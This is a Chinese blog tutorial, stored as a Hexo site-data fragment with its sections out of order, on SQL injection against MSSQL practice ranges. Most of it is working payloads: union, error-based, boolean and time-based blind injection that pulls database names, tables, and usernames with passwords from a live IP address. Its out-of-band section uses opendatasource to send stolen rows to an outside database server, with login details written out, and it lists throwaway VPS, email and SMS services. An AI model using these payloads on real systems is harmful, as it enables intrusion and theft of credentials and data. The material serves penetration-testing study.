id=\"3、通过显错点获取数据库信息\"><a href=\"#3、通过显错点获取数据库信息\" class=\"headerlink\" title=\"3、通过显错点获取数据库信息\"></a>3、通过显错点获取数据库信息</h2><p>1、获取数据库版本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select @@version),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t012f189779bf95f529.png\"><br>2、查询当前数据库名称<br>通过轮询db_name(<em>)里</em>的内容，获取所有数据库库名</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name()),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(1)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(2)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(3)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(4)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(5)),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t01b48e6d8d29baefaa.png\"><br><img src=\"https://p4.ssl.qhimg.com/t01409617b57bcdb809.png\"><br>3、查询当前用户</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select user),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01e868a65736530e91.png\"></p>\n<h2 id=\"4、查询表名\"><a href=\"#4、查询表名\" class=\"headerlink\" title=\"4、查询表名\"></a>4、查询表名</h2><p>查询dbo.sysobjects表中用户创建的表，获取其对应的id和name</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t0125721234db891a35.png\"><br>查询下一个表名</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用&lt;&gt;获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id &lt;&gt; 5575058 -- qwe#使用not in获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id not in (&#x27;5575058&#x27;) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t011661598555b1c380.png\"></p>\n<h2 id=\"5、查询列名\"><a href=\"#5、查询列名\" class=\"headerlink\" title=\"5、查询列名\"></a>5、查询列名</h2><p>这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27;-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p2.ssl.qhimg.com/t01c91e959dfc120a52.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01a8944599c209006a.png\"></p>\n<h2 id=\"6、information-schema\"><a href=\"#6、information-schema\" class=\"headerlink\" title=\"6、information_schema\"></a>6、information_schema</h2><p>值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 table_name from information_schema.tables where table_name &lt;&gt; &#x27;manager&#x27;),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t0137da5be343f70f2e.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; ),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; and column_name not in (&#x27;id&#x27;,&#x27;username&#x27;)),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01498aaac4f709b4ec.png\"><br><img src=\"https://p4.ssl.qhimg.com/t011d74ab2d9658c021.png\"></p>\n<h2 id=\"7、获取数据\"><a href=\"#7、获取数据\" class=\"headerlink\" title=\"7、获取数据\"></a>7、获取数据</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username &lt;&gt; &#x27;admin_mz&#x27;-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t01188d69b4c3307b79.png\"><br>解密获取密码<br><img src=\"https://p2.ssl.qhimg.com/t016cb243729a0f493a.png\"></p>\n<h1 id=\"0x04-报错注入\"><a href=\"#0x04-报错注入\" class=\"headerlink\" title=\"0x04 报错注入\"></a>0x04 报错注入</h1><p>mssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。</p>\n<h2 id=\"1、直接报错\"><a href=\"#1、直接报错\" class=\"headerlink\" title=\"1、直接报错\"></a>1、直接报错</h2><p>等号两边数据类型不一致配合子查询获取数据。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取数据库库名?id=1&#x27; and 1=(select db_name()) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01f288e811fb1764c3.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取第一个表名?id=1&#x27; and 1=(select top 1 name from dbo.sysobjects) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t01c2dcc7214ea0790b.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将数据连接显示?id=1&#x27;  and 1=stuff((select db_name() for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2、convert-函数\"><a href=\"#2、convert-函数\" class=\"headerlink\" title=\"2、convert()函数\"></a>2、convert()函数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">convert(<span class=\"keyword\">int</span>,db_name())，将第二个参数的值转换成第一个参数的<span class=\"keyword\">int</span>类型。</span><br></pre></td></tr></table></figure>\n\n<p>具体用法如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取数据库库名?id=1&#x27; and 1=convert(int,(select db_name())) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0147c5729c269d0ac8.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取数据库版本?id=1&#x27; and 1=convert(int,(select @@version))) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t0171dbf58ebfd7a276.png\"></p>\n<h2 id=\"3、cast-函数\"><a href=\"#3、cast-函数\" class=\"headerlink\" title=\"3、cast()函数\"></a>3、cast()函数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CAST(expression <span class=\"keyword\">AS</span> data_type)，将<span class=\"keyword\">as</span>前的参数以<span class=\"keyword\">as</span>后指定了数据类型转换。</span><br></pre></td></tr></table></figure>\n\n<p>具体用法如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询当前数据库?id=1&#x27; and 1=(select cast(db_name() as int)) -- qe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01df3bbcf46b69a91b.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询第一个数据表?id=1&#x27; and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t0194b470a057b6bc45.png\"></p>\n<h2 id=\"4、数据组合输出\"><a href=\"#4、数据组合输出\" class=\"headerlink\" title=\"4、数据组合输出\"></a>4、数据组合输出</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将数据表组合输出?id=1&#x27; and 1=stuff((select quotename(name) from dbo.sysobjects  for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t0126a37aad232cde94.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询users表中的用户名并组合输出?id=1&#x27;  and 1=stuff((select quotename(username) from users for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t01c6b6db795cf3b7df.png\"></p>\n<h1 id=\"0x05-布尔盲注\"><a href=\"#0x05-布尔盲注\" class=\"headerlink\" title=\"0x05 布尔盲注\"></a>0x05 布尔盲注</h1><h2 id=\"1、查询数据库库名\"><a href=\"#1、查询数据库库名\" class=\"headerlink\" title=\"1、查询数据库库名\"></a>1、查询数据库库名</h2><p>1、查询数据库库名长度为11</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t01d1a89cb7da54caa8.png\"><br>2、查询第一个字符的ascii码为109</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))&gt;109</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0116e04363840e9a62.png\"><br><img src=\"https://p3.ssl.qhimg.com/t015abf97111fa1b9af.png\"><br>3、查询第二个字符的ascii码为111</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t01e337930ebb104e75.png\"><br>4、获取所有ascii码之后，解码获取数据<br><img src=\"https://p1.ssl.qhimg.com/t011e5c21dc29f4e03b.png\"></p>\n<h2 id=\"2、查询表名\"><a href=\"#2、查询表名\" class=\"headerlink\" title=\"2、查询表名\"></a>2、查询表名</h2><p>除了像上面查询库名使用了ascii码外，还可以直接猜解字符串</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t019bb4ff316062345b.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,6)=&#x27;manage&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t017026272920723c8d.png\"></p>\n<h1 id=\"0x06-延时盲注\"><a href=\"#0x06-延时盲注\" class=\"headerlink\" title=\"0x06 延时盲注\"></a>0x06 延时盲注</h1><h2 id=\"1、延时函数-WAITFOR-DELAY\"><a href=\"#1、延时函数-WAITFOR-DELAY\" class=\"headerlink\" title=\"1、延时函数 WAITFOR DELAY\"></a>1、延时函数 WAITFOR DELAY</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：n表示延时几秒WAITFOR DELAY <span class=\"string\">&#x27;0:0:n&#x27;</span>id=<span class=\"number\">1</span> <span class=\"keyword\">if</span> (布尔盲注的判断语句) WAITFOR DELAY <span class=\"string\">&#x27;0:0:5&#x27;</span> -- qwe</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2、查询数据\"><a href=\"#2、查询数据\" class=\"headerlink\" title=\"2、查询数据\"></a>2、查询数据</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t018900c2d899e6edae.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#判断如果第一个表的表名的第一个字符为m，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27;) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01b7f6779fd2f33d7e.png\"></p>\n<h1 id=\"0x07-反弹注入\"><a href=\"#0x07-反弹注入\" class=\"headerlink\" title=\"0x07 反弹注入\"></a>0x07 反弹注入</h1><p>就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。<br>反弹注入条件相对苛刻一些，需要一台搭建了mssql数据库的vps服务器，需要开启堆叠注入。<br>反弹注入需要使用opendatasource函数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">申请免费云服务器：香港云：http:<span class=\"comment\">//www.webweb.com/在线邮箱：http://24mail.chacuo.net/接码平台：https://yunduanxin.net/</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"1、环境准备\"><a href=\"#1、环境准备\" class=\"headerlink\" title=\"1、环境准备\"></a>1、环境准备</h2><p>1、首先打开靶场<br><img src=\"https://p3.ssl.qhimg.com/t0125c9c6371197c223.png\"><br>3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE test(name VARCHAR(<span class=\"number\">255</span>))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01202219ab5bf4ddfc.png\"></p>\n<h2 id=\"2、获取数据库所有表\"><a href=\"#2、获取数据库所有表\" class=\"headerlink\" title=\"2、获取数据库所有表\"></a>2、获取数据库所有表</h2><p>1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询sysobjects表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p>2、执行成功页面返回正常。<br><img src=\"https://p5.ssl.qhimg.com/t01dbe22abee44923d4.png\"><br>3、在数据库中成功获取到数据。<br><img src=\"https://p2.ssl.qhimg.com/t014a5c058780e87669.png\"></p>\n<h2 id=\"3、获取数据库admin表中的所有列名\"><a href=\"#3、获取数据库admin表中的所有列名\" class=\"headerlink\" title=\"3、获取数据库admin表中的所有列名\"></a>3、获取数据库admin表中的所有列名</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name=&#x27;admin&#x27;-- qwe#查询syscolumns表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t018c0e415a5ac7d536.png\"><br><img src=\"https://p1.ssl.qhimg.com/t01957478eb17de4d8a.png\"></p>\n<h2 id=\"4、获取数据\"><a href=\"#4、获取数据\" class=\"headerlink\" title=\"4、获取数据\"></a>4、获取数据</h2><p>1、首先新建一个表，里面放三个字段，分别是id，username和passwd。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE data(id <span class=\"keyword\">INT</span>,username VARCHAR(<span class=\"number\">255</span>),passwd VARCHAR(<span class=\"number\">255</span>))</span><br></pre></td></tr></table></figure>\n\n<p>2、获取admin表中的数据</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=<span class=\"number\">1</span><span class=\"string\">&#x27;;insert into opendatasource(&#x27;</span>sqloled<span class=\"string\">b&#x27;,&#x27;</span>server=SQL5095.site4now.net,<span class=\"number\">1433</span>;uid=DB_14DC18D_test_admin;pwd=<span class=\"number\">123456</span>;database=DB_14DC18D_test<span class=\"string\">&#x27;).DB_14DC18D_test.dbo.data select id,username,passwd from  admin -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01b7ef0a0f00234293.png\"><br><img src=\"https://p4.ssl.qhimg.com/t01ce04ab44180c2881.png\"></p>\n<h1 id=\"0x08-总结\"><a href=\"#0x08-总结\" class=\"headerlink\" title=\"0x08 总结\"></a>0x08 总结</h1><pre><code>完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。\n\n靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～\n</code></pre>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文由ajie原创发布<br>转载，请参考转载声明，注明出处： <a href=\"https://www.anquanke.com/post/id/248896\">https://www.anquanke.com/post/id/248896</a><br>安全客 - 有思想的安全新媒体</p>\n</blockquote>\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～</p>\n<h1 id=\"0x02-注入前准备\"><a href=\"#0x02-注入前准备\" class=\"headerlink\" title=\"0x02 注入前准备\"></a>0x02 注入前准备</h1><h2 id=\"1、确定注入点\"><a href=\"#1、确定注入点\" class=\"headerlink\" title=\"1、确定注入点\"></a>1、确定注入点</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 and 1=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://p4.ssl.qhimg.com/t014e83f602b04a19d1.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 and 1=2</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://p0.ssl.qhimg.com/t01d16d8612cfb9ab51.png\"></p>\n<h2 id=\"2、判断是否为mssql数据库\"><a href=\"#2、判断是否为mssql数据库\" class=\"headerlink\" title=\"2、判断是否为mssql数据库\"></a>2、判断是否为mssql数据库</h2><p>sysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from sysobjects)&gt;0</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01b69ef8d50a8162d7.png\"><br>还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY &#x27;00:00:10&#x27;; -- asd</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t0196919ac7c368e603.png\"></p>\n<h2 id=\"3、相关概念\"><a href=\"#3、相关概念\" class=\"headerlink\" title=\"3、相关概念\"></a>3、相关概念</h2><h3 id=\"系统自带库\"><a href=\"#系统自带库\" class=\"headerlink\" title=\"系统自带库\"></a>系统自带库</h3><p>MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。<br>这里了解一下系统级库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。</span><br><span class=\"line\">model：模版数据库</span><br><span class=\"line\">tempdb：临时容器</span><br><span class=\"line\">msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。</span><br></pre></td></tr></table></figure>\n<h3 id=\"系统自带表\"><a href=\"#系统自带表\" class=\"headerlink\" title=\"系统自带表\"></a>系统自带表</h3><p>MSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。</span><br><span class=\"line\">syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。</span><br></pre></td></tr></table></figure>\n<p>就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个’U’为用户所创建，一个’S’为系统所创建。其他对象类型如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 